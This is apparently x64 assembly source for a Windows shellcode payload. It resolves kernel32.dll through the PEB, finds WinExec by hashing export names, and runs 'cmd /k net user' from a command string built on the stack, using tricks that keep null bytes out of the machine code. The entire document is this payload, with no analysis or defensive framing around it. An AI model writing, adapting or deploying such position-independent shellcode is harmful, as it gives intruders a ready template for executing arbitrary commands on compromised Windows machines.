
            bits 64
            section .text
                global _start
                
            _start:

                push rbp
                mov rbp, rsp
                sub rsp, 40h
                xor r11, r11

                ; ### reserve memory for local variables ###
                ; 08h: Number of functions
                ; 10h: Address table
                ; 18h: Name pointer table
                ; 20h: Ordinal table
                ; 28h: not used (pointer to WinExec string)
                ; 30h: not used (address to WinExec function)
                ; 38h: reserved
                mov [rbp - 08h], r11     
                mov [rbp - 10h], r11   
                mov [rbp - 18h], r11   
                mov [rbp - 20h], r11
                mov [rbp - 28h], r11
                mov [rbp - 30h], r11
                mov [rbp - 38h], r11 

                ; ### find kernel32.dll base ###
                ; peb           = gs + 60h
                ; ldr           = peb + 18h
                ; ModuleList    = ldr + 20h
                ; ModuleList    -> Process
                ; ModuleList    -> NTDLL
                ; ModuleList    -> KERNEL32 + 20h
                ; kernel32 base -> rbx
                mov r11, gs:[r11 + 60h]
                mov r11, [r11 + 18h]
                mov r11, [r11 + 20h]
                mov r8, [r11]
                mov r11, [r8]
                mov r11, [r11 + 20h]
                mov r8, r11

                ; ### find export table ###
                ; base + 0x3c               = RVA PE Signature
                ; RVA PE Signature + base   = VA PE Signature
                ; VA PE Signature + 0x88    = RVA Export Table
                ; RVA Export Table          -> rax
                ; RVA Export Table + base   = VA Export Table

                sub rax, rax
                mov r11d, [r8 + 0x3c] 
                add r11, r8 
                mov al, 88h 
                mov r11d, [r11 + rax] 
                add r11, r8 

                ; ### extract data and save in local variables ###
                ; Export Table + 0x14           = Number of Functions
                ; Export Table + 0x1c           = RVA Address Table
                ; Export table + 0x20           = RVA Name Pointer Table
                ; Export Table + 0x24           = RVA Ordinal Table
                ; RVA Address Table + Base      = VA Address Table
                ; RVA Name Pointer Table + Base = VA Name Pointer Table
                ; RVA Ordinal Table + Base      = VA Ordinal Table

                mov eax, [r11 + 0x14]  
                mov [rbp - 8h], rax      
                mov eax, [r11 + 0x1c]  
                add rax, r8    
                mov [rbp - 10h], rax  
                mov eax, [r11 + 0x20]  
                add rax, r8    
                mov [rbp - 18h], rax  
                mov eax, [r11 + 0x24]   
                add rax, r8    
                mov [rbp - 20h], rax  

                mov r11, 0xFFFFFFFFFFFFFFFF
                add r11, 1
                sub rax, rax
                mov eax, [rbp - 8h]    
                mov r10, [rbp - 18h]          

            findFuncPos:
                xor rbx, rbx  
                mov r11d, [rbp - 8h]
                sub r11d, eax
                mov edx, [r10]
                add rdx, r8

            HashLoop:
                mov rdi, 0xFFFFFFFFFFFFFFFF
                add rdi, 1
                mov dil, [rdx]
                test dil, dil
                jz HashCompare
                rol ebx, 162       
                add ebx, edi
                inc rdx
                jmp HashLoop

            HashCompare:
                cmp ebx, 0x79cb7   
                je WinExecFound
                
                add r10, 4                
                lea rax, [rax - 1]
                ;cmp rax, 0
                test rax, rax
                ;jnz findFuncPos
                jnz findFuncPos
                jmp exit

            WinExecFound:
                ; load ordinal_table
                ; load address_table
                ; calculate WinExec ordinal
                ; calculate WinExec RVA
                ; calculate WinExec VA
                ; move WinExec VA into rax
                mov rax, [rbp - 20h]
                mov rdi, [rbp - 10h] 
                mov ax, [rax + r11 * 2]
                mov r11d, [rdi + r11 * 4]
                add r11, r8
                mov rax, r11

            InvokeWinExec:
                xor rcx, rcx
                xor rdx, rdx
                push rcx 
                ; begin stacked_command
                mov rcx, 0x1172657375207465            ; et user
                shl rcx, 8
                shr rcx, 8
                push rcx
                mov rcx, 0x6e206b2f20646d63            ; cmd /k n
                push rcx
                ; end stacked_command

                ; rcx = command
                ; uCmdSHow = SW_SHOWDEFAULT
                ; 16-byte Stack Alignment
                ; STACK + 32 Bytes (shadow spaces)
                ; call WinExec
                mov rcx, rsp               
                mov dl, 0x1                
                and rsp, -16               
                sub rsp, 32                
                call rax                   

                ; clear stack
                ; local variables
                ; pushes for ebp and WinExec
                ; pushes for WinExec invokation
                add rsp, 38h                 
                add rsp, 18h                 
                add rsp, 8h                  
                pop rbp
                ret

            exit:
                ret
        